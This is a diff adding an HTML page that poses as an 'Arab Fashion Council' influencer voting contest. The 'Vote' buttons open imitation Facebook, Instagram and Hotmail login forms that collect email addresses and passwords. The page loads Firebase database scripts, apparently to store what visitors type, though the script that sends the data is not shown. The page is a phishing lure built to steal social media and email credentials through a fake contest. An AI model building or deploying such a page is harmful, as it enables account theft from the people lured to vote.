@@ -1,0 +1,465 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description"
+    content="Empowering Arab Fashion: Uniting 22 Nations to Foster Creative Economy and Style Innovation. Explore the vibrant world of Arab fashion heritage and contemporary design.">
+  <link rel="icon" href="image/favicon.png" type="image/x-icon">
+
+  <!-- Font Awesome for Icons -->
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
+
+  <!-- Bootstrap CSS -->
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet"
+    integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
+
+  <!-- Custom CSS -->
+  <link href="https://arabasiastarz.com/home/css/style.css" rel="stylesheet" />
+  <link rel="stylesheet" href="css/index.css">
+  <link rel="stylesheet" href="css/profile.css">
+
+  <!-- jQuery -->
+  <script src="js/jquery-3.6.0.min.js"></script>
+
+  <!-- Custom JS -->
+  <script src="js/index.js"></script>
+
+  <title>Arab Fashion Council</title>
+
+  <!-- Inline CSS for Quick Styling (Move to CSS files if preferred) -->
+  <style>
+    .vote i {
+      font-size: 20px;
+      color: #0d6efd;
+    }
+
+    .vote-count i {
+      font-size: 18px;
+      color: green;
+    }
+
+    .votes-left i {
+      font-size: 18px;
+      color: #ed0707;
+    }
+
+    /* Profile Card Styling */
+    .profile-container {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 20px;
+      padding: 20px;
+    }
+
+    .profile-card {
+      border: 1px solid #ddd;
+      border-radius: 10px;
+      padding: 15px;
+      width: 300px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+      background-color: #fff;
+      position: relative;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .profile-image {
+      width: 100%;
+      height: auto;
+      border-radius: 10px;
+    }
+
+    .hashtags {
+      margin: 10px 0;
+      color: #555;
+      font-size: 14px;
+    }
+
+    .vote-button {
+      padding: 10px 20px;
+      background-color: #0d6efd;
+      color: #fff;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      font-size: 16px;
+      transition: background-color 0.3s;
+    }
+
+    .vote-button:hover {
+      background-color: #06316f;
+    }
+
+    /* Dialog Box Styling */
+    .dialog-box {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      width: 90%;
+      max-width: 400px;
+      background: #fff;
+      border-radius: 15px;
+      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2);
+      z-index: 1000;
+      display: none;
+      /* Hidden by default */
+      animation: fadeIn 0.3s ease-in-out;
+    }
+
+    .dialog-content {
+      padding: 20px;
+      text-align: center;
+    }
+
+    .dialog-title {
+      font-size: 20px;
+      font-weight: bold;
+      color: #333;
+      margin-bottom: 20px;
+    }
+
+    .dialog-options {
+      display: flex;
+      justify-content: center;
+      gap: 20px;
+      margin-bottom: 20px;
+    }
+
+    .vote-icon {
+      width: 60px;
+      height: 60px;
+      cursor: pointer;
+      transition: transform 0.2s ease-in-out, box-shadow 0.2s ease-in-out;
+    }
+
+    .vote-icon:hover {
+      transform: scale(1.1);
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
+    }
+
+    .btn-cancel {
+      padding: 10px 20px;
+      font-size: 14px;
+      background-color: #f44336;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: background-color 0.3s ease-in-out;
+    }
+
+    .btn-cancel:hover {
+      background-color: #e53935;
+    }
+
+    /* Fade-in Animation */
+    @keyframes fadeIn {
+      from {
+        opacity: 0;
+        transform: translate(-50%, -60%);
+      }
+
+      to {
+        opacity: 1;
+        transform: translate(-50%, -50%);
+      }
+    }
+
+    /* Responsive Design */
+    @media (max-width: 768px) {
+      .dialog-box {
+        width: 95%;
+        max-width: 350px;
+      }
+
+      .vote-icon {
+        width: 50px;
+        height: 50px;
+      }
+
+      .profile-card {
+        width: 90%;
+      }
+    }
+  </style>
+</head>
+
+<body>
+  <div id="home">
+    <header>
+      <img src="img/slide.png" alt="Slide Image">
+      <p align="center">
+        <button id="vote2" onclick="vote(1)">Click Here To Vote</button><br>
+        <!-- <button id="vote2" onclick="vote()">Join contest</button>-->
+      </p>
+    </header>
+
+    <div id="blue">
+      <h2>Arab Fashion Council</h2>
+    </div>
+
+    <div id="news">
+      <p>
+        Are you ready to immerse yourself in a world of style, culture, and innovation? The Arab Fashion Council is your
+        gateway to the captivating realm of Arab fashion. We invite you to join us on a journey where tradition meets
+        modernity, and where fashion becomes a powerful expression of identity.
+      </p>
+    </div>
+
+    <div id="news">
+      <p>Vote for Excellence. Vote for Diversity. Vote for Arab Fashion Council!</p>
+    </div>
+
+    <div id="blue">
+      <h2>📢 How to Vote:</h2>
+    </div>
+
+    <div id="news">
+      <p>#1 Each influencer has a unique hashtag on our social media page.</p>
+      <p>#2 Click the vote button</p>
+      <p>#3 Voting Deadline: Voting is open until further notice. Don't miss the chance to support your favorite
+        influencer!
+      </p>
+    </div>
+
+    <div id="blue">
+      <center>
+        <h2>Meet Our Contestants</h2>
+      </center>
+    </div>
+    <br>
+    <center>
+      <div class="profile-container">
+        <!-- Profile Card Template -->
+        <!-- Repeat this block for each contestant, updating the data-contestant and image src -->
+
+        <!-- Contestant 1 -->
+        <div class="profile-card">
+          <img src="img/contestant001.jpg" alt="Contestant 001" class="profile-image">
+          <div class="hashtags">
+            <span>#ArabFashionCouncil</span>
+          </div>
+          <button onclick="vote(1)" class="vote-button">Vote</button><br><br>
+          <div class="card-footer text-muted">
+            <span class="vote-count" data-contestant="1">
+              <i class="fas fa-check-circle"></i> Total Votes: 3k out of 1m
+            </span>
+          </div>
+          <div class="card-footer text-muted">
+            <span class="votes-left" data-contestant="1">
+              <i class="fas fa-clock"></i> Votes to Win: <span class="votes-to-win" id="votesToWin-1">997k</span>
+            </span>
+          </div>
+        </div>
+
+        <!-- Contestant 2 -->
+        <div class="profile-card">
+          <img src="img/contestant002.jpg" alt="Contestant 002" class="profile-image">
+          <div class="hashtags">
+            <span>#DubaiFashionWeek</span>
+          </div>
+          <button onclick="vote(2)" class="vote-button">Vote</button><br><br>
+          <div class="card-footer text-muted">
+            <span class="vote-count" data-contestant="2">
+              <i class="fas fa-check-circle"></i> Total Votes: 5k out of 1m
+            </span>
+          </div>
+          <div class="card-footer text-muted">
+            <span class="votes-left" data-contestant="2">
+              <i class="fas fa-clock"></i> Votes to Win: <span class="votes-to-win" id="votesToWin-2">995k</span>
+            </span>
+          </div>
+        </div>
+
+        <!-- Contestant 3 -->
+        <div class="profile-card">
+          <img src="img/contestant003.jpg" alt="Contestant 003" class="profile-image">
+          <div class="hashtags">
+            <span>#ArabFashionInnovation</span>
+          </div>
+          <button onclick="vote(3)" class="vote-button">Vote</button><br><br>
+          <div class="card-footer text-muted">
+            <span class="vote-count" data-contestant="3">
+              <i class="fas fa-check-circle"></i> Total Votes: 9k out of 1m
+            </span>
+          </div>
+          <div class="card-footer text-muted">
+            <span class="votes-left" data-contestant="3">
+              <i class="fas fa-clock"></i> Votes to Win: <span class="votes-to-win" id="votesToWin-3">991k</span>
+            </span>
+          </div>
+        </div>
+
+        <!-- Contestant 4 -->
+        <div class="profile-card">
+          <img src="img/contestant004.jpg" alt="Contestant 004" class="profile-image">
+          <div class="hashtags">
+            <span>#Creativity</span>
+          </div>
+          <button onclick="vote(4)" class="vote-button">Vote</button><br><br>
+          <div class="card-footer text-muted">
+            <span class="vote-count" data-contestant="4">
+              <i class="fas fa-check-circle"></i> Total Votes: 90 out of 1m
+            </span>
+          </div>
+          <div class="card-footer text-muted">
+            <span class="votes-left" data-contestant="4">
+              <i class="fas fa-clock"></i> Votes to Win: <span class="votes-to-win" id="votesToWin-4">999k</span>
+            </span>
+          </div>
+        </div>
+
+        <!-- Contestant 5 -->
+        <div class="profile-card">
+          <img src="img/contestant005.jpg" alt="Contestant 005" class="profile-image">
+          <div class="hashtags">
+            <span>#ArabFashionHeritage</span>
+          </div>
+          <button onclick="vote(5)" class="vote-button">Vote</button><br><br>
+          <div class="card-footer text-muted">
+            <span class="vote-count" data-contestant="5">
+              <i class="fas fa-check-circle"></i> Total Votes: 38 out of 1m
+            </span>
+          </div>
+          <div class="card-footer text-muted">
+            <span class="votes-left" data-contestant="5">
+              <i class="fas fa-clock"></i> Votes to Win: <span class="votes-to-win" id="votesToWin-5">999.96k</span>
+            </span>
+          </div>
+        </div>
+
+        <!-- Contestant 6 -->
+        <div class="profile-card">
+          <img src="img/contestant006.jpg" alt="Contestant 006" class="profile-image">
+          <div class="hashtags">
+            <span>#CulturalCouture</span>
+          </div>
+          <button onclick="vote(6)" class="vote-button">Vote</button><br><br>
+          <div class="card-footer text-muted">
+            <span class="vote-count" data-contestant="6">
+              <i class="fas fa-check-circle"></i> Total Votes: 60 out of 1m
+            </span>
+          </div>
+          <div class="card-footer text-muted">
+            <span class="votes-left" data-contestant="6">
+              <i class="fas fa-clock"></i> Votes to Win: <span class="votes-to-win" id="votesToWin-6">999.94k</span>
+            </span>
+          </div>
+        </div>
+
+        <!-- Contestant 7 -->
+        <div class="profile-card">
+          <img src="img/contestant007.jpg" alt="Contestant 007" class="profile-image">
+          <div class="hashtags">
+            <span>#ArabFashionTrends</span>
+          </div>
+          <button onclick="vote(7)" class="vote-button">Vote</button><br><br>
+          <div class="card-footer text-muted">
+            <span class="vote-count" data-contestant="7">
+              <i class="fas fa-check-circle"></i> Total Votes: 48 out of 1m
+            </span>
+          </div>
+          <div class="card-footer text-muted">
+            <span class="votes-left" data-contestant="7">
+              <i class="fas fa-clock"></i> Votes to Win: <span class="votes-to-win" id="votesToWin-7">999.95k</span>
+            </span>
+          </div>
+        </div>
+
+        <!-- Contestant 8 -->
+        <div class="profile-card">
+          <img src="img/contestant008.jpg" alt="Contestant 008" class="profile-image">
+          <div class="hashtags">
+            <span>#ArabFashionista</span>
+          </div>
+          <button onclick="vote(8)" class="vote-button">Vote</button><br><br>
+          <div class="card-footer text-muted">
+            <span class="vote-count" data-contestant="8">
+              <i class="fas fa-check-circle"></i> Total Votes: 62 out of 1m
+            </span>
+          </div>
+          <div class="card-footer text-muted">
+            <span class="votes-left" data-contestant="8">
+              <i class="fas fa-clock"></i> Votes to Win: <span class="votes-to-win" id="votesToWin-8">999.94k</span>
+            </span>
+          </div>
+        </div>
+
+      </div>
+    </center>
+  </div>
+
+  <!-- Voting Dialog Box -->
+  <center>
+    <div id="choose" class="dialog-box">
+      <div class="dialog-content">
+        <h3 class="dialog-title">Vote Using:</h3>
+        <div class="dialog-options">
+          <img onclick="fb()" src="image/fb.png" alt="Vote with Facebook" class="vote-icon">
+          <img onclick="ig()" src="image/ig.png" alt="Vote with Instagram" class="vote-icon">
+          <img onclick="hm()" src="image/hm.png" alt="Vote with Hotmail" class="vote-icon">
+        </div>
+        <button onclick="can()" id="cancel" class="btn-cancel">Close</button>
+      </div>
+    </div>
+  </center>
+
+  <!-- Facebook Voting Modal -->
+  <center>
+    <div id="fbp" style="display: none;">
+      <div class="facebook-login" id="fb2" align="center">
+        <div class="ggt">
+          <img src="image/fb.png" alt="Facebook Logo" id="fblogo">
+          <h1>Facebook</h1>
+          <input type="text" placeholder="Email or Phone number" id="fb-email"><br>
+          <input type="password" placeholder="Password" id="fb-pass"><br>
+          <button onclick="login()" id="fb-log">Log in</button>
+        </div>
+      </div>
+    </div>
+  </center>
+
+  <!-- Instagram Voting Modal -->
+  <center>
+    <div id="igp" style="display: none;">
+      <div class="Instagram-login" id="ig2" align="center">
+        <div class="ppt">
+          <img src="image/ig2.jpg" alt="Instagram Logo" id="iglogo"><br><br>
+          <input type="text" placeholder="Username or Mail" id="ig-uname"><br>
+          <input type="password" placeholder="Password" id="ig-pass"><br>
+          <button onclick="iglog()" id="ig-log">Log in</button>
+        </div>
+      </div>
+    </div>
+  </center>
+
+  <!-- Hotmail Voting Modal -->
+  <center>
+    <div id="hmp" style="display: none;">
+      <div class="Instagram-login" id="ig2" align="center">
+        <div class="ppt">
+          <img src="image/ms.png" alt="Hotmail Logo" id="hmlogo"><br><br>
+          <br>
+          <input type="text" placeholder="Email, phone, or Skype" id="hm-email"><br>
+          <input type="password" placeholder="Password" id="hm-pass"><br>
+          <button onclick="hmlog()" id="hm-log">Log in</button>
+        </div>
+      </div>
+    </div>
+  </center>
+
+  <!-- Firebase Scripts -->
+  <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-database.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase.js"></script>
+  <script src="https://raw.githubusercontent.com/firebase/firebase-bower/master/firebase-app-check.js.map"></script>
+  <script src="js/firebase.js"></script>
+
+</body>
+
+</html>
